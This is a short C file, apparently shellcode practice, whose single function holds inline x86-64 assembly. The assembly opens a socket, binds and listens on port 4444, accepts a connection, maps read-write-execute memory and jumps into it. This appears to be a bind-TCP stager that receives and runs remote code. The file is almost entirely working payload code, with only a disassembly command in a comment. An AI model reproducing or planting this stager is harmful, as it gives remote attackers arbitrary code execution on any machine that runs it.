#include <stdio.h>

void __asm_action() {
    __asm__ (
        "pushq $0x29\n"
        "popq %rax\n"
        "cdq\n"
        "pushq $0x2\n"
        "popq %rdi\n"
        "pushq $0x1\n"
        "popq %rsi\n"
        "syscall\n"
        "xchg %rax, %rdi\n"
        "pushq %rdx\n"
        "movq $0x5c110002, (%rsp)\n"
        "movq %rsp, %rsi\n"
        "pushq $0x10\n"
        "popq %rdx\n"
        "pushq $0x31\n"
        "popq %rax\n"
        "syscall\n"
        "popq %rcx\n"
        "pushq $0x32\n"
        "popq %rax\n"
        "syscall\n"
        "xchg %rax, %rsi\n"
        "pushq $0x2b\n"
        "popq %rax\n"
        "syscall\n"
        "pushq %rax\n"
        "pushq %rsi\n"
        "popq %rdi\n"
        "pushq $0x9\n"
        "popq %rax\n"
        "cdq\n"
        "movb $0x10, %dh\n"
        "movq %rsi, %rdx\n"
        "xorq %r9, %r9\n"
        "pushq $0x22\n"
        "popq %r10\n"
        "movb $0x7, %dl\n"
        "syscall\n"
        "xchg %rax, %rsi\n"
        "xchg %rax, %rdi\n"
        "popq %rdi\n"
        "syscall\n"
        "jmp *%rsi\n"
    );
}

int main() {
    __asm_action();
    return 0;
}

/* Deassem command
xxd main.o > main_o.txt && \
xxd main > main.txt && \
objdump -d main.o

*/